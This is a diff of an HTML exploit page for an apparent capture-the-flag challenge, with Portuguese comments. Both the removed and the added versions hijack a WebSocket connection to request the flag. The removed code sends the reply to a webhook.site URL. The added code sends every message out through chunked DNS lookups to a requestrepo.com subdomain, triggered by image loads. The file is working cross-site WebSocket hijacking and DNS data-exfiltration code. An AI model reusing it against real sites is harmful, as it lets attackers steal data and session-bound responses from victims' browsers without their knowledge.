@@ -1,22 +1,87 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>DNS Exfiltration</title>
+</head>
 <body>
-<script>
-(async () => {
-  // 1) Conecta ao WebSocket do desafio
-  const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
-  ws.onopen = () => {
-    // 2) Pede a flag
-    ws.send(JSON.stringify({sender:'user', message:'/getFlag'}));
-  };
-  ws.onmessage = async (e) => {
-    const data = JSON.parse(e.data);
-      // 3) Exfiltra para seu webhook
-      await fetch('https://60ceeedd-4d07-4620-94b4-d916596ae4d6.webhook.site/?flag=' +
-                  encodeURIComponent(data.message));
-  };
-})();
-</script>
-<p>Loading…</p>
+    <h1>Connecting...</h1>
+    
+    <script>
+        // Seu subdomínio de captura DNS (substitua pelo seu)
+        const dnsLogger = "8fx9jtvx.requestrepo.com";
+        
+        // Enviar ping inicial para confirmar que o script está rodando
+        new Image().src = `http://init.${dnsLogger}`;
+        
+        // Função para exfiltrar dados via consulta DNS
+        function exfiltrateViaDNS(data) {
+            // Codificar dados para URL segura
+            const encoded = encodeURIComponent(data)
+                .replace(/\./g, '-dot-')
+                .replace(/\//g, '-slash-')
+                .replace(/:/g, '-colon-');
+            
+            // Dividir em chunks para evitar problemas com nomes de domínio longos
+            const chunks = [];
+            let temp = '';
+            for (let i = 0; i < encoded.length; i++) {
+                temp += encoded[i];
+                if (temp.length >= 30 || i === encoded.length - 1) {
+                    chunks.push(temp);
+                    temp = '';
+                }
+            }
+            
+            // Enviar cada chunk como uma consulta DNS separada
+            chunks.forEach((chunk, index) => {
+                new Image().src = `http://data-${index}-${chunk}.${dnsLogger}`;
+            });
+        }
+        
+        // Conectar ao WebSocket alvo
+        const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+        
+        socket.onopen = function() {
+            // Enviar ping quando a conexão for estabelecida
+            new Image().src = `http://connected.${dnsLogger}`;
+            
+            // Enviar comando para obter a flag
+            socket.send(JSON.stringify({
+                sender: 'user',
+                message: '/getFlag'
+            }));
+            
+            // Enviar ping para confirmar que o comando foi enviado
+            new Image().src = `http://command-sent.${dnsLogger}`;
+        };
+        
+        socket.onmessage = function(event) {
+            try {
+                const data = JSON.parse(event.data);
+                
+                // Enviar todas as mensagens via DNS
+                exfiltrateViaDNS(data.message);
+                
+                // Se contiver a flag, enviar um identificador especial
+                if (data.message && data.message.includes('Flag:')) {
+                    new Image().src = `http://flag-found.${dnsLogger}`;
+                    exfiltrateViaDNS("FLAG:" + data.message);
+                }
+            } catch (e) {
+                // Enviar erro via DNS
+                exfiltrateViaDNS("ERROR:" + e.message);
+            }
+        };
+        
+        socket.onerror = function(error) {
+            // Enviar erro via DNS
+            exfiltrateViaDNS("WS_ERROR");
+        };
+        
+        socket.onclose = function() {
+            // Enviar aviso de fechamento via DNS
+            exfiltrateViaDNS("WS_CLOSED");
+        };
+    </script>
 </body>
 </html>
